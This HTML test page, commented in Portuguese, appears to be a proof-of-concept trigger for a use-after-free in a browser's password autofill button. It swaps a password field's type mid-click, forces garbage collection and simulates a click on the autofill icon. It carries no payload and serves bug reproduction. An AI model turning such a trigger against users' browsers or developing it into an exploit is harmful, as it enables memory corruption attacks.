<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>AutoFill Button UAF Test</title>
    <style>
        .login-input {
            width: 320px;
            height: 50px;
            font-size: 20px;
            padding-right: 40px;
        }
        #btn-trigger {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h3>Teste de UAF no Botão de AutoFill</h3>
    
    <!-- Formulário com dicas explícitas de credenciais para forçar a criação do botão nativo -->
    <form autocomplete="on">
        <input class="login-input" id="pwd" type="password" name="password" autocomplete="current-password" placeholder="Senha">
    </form>

    <br>
    <button id="btn-trigger">Disparar Teste Automático</button>
    <div id="status" style="margin-top: 15px; font-family: monospace;">Aguardando ação...</div>

    <script>
    const input = document.getElementById('pwd');
    const status = document.getElementById('status');

    // 1. O manipulador escuta o clique no campo
    input.addEventListener('click', (e) => {
        status.innerText = 'Evento click recebido. Alterando input.type...';
        
        // Destrói o TextFieldInputType enquanto o evento de clique está ativo
        input.type = 'button';

        // Força coleta de lixo caso o runtime exponha controladores de GC
        if (typeof gc === 'function') {
            gc();
        } else if (window.GCController) {
            window.GCController.collect();
        }
    }, { once: true });

    // 2. Disparo automatizado clicando no canto direito interno do input (onde fica o botão de chave/autofill)
    document.getElementById('btn-trigger').onclick = () => {
        const rect = input.getBoundingClientRect();
        
        // Coordenadas calculadas para a extremidade direita do campo
        const clickX = rect.left + rect.width - 15;
        const clickY = rect.top + (rect.height / 2);

        const evt = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window,
            clientX: clickX,
            clientY: clickY
        });

        input.dispatchEvent(evt);

        setTimeout(() => {
            status.innerText = 'Teste finalizado: Sobreviveu (sem crash).';
        }, 100);
    };
    </script>
</body>
</html>
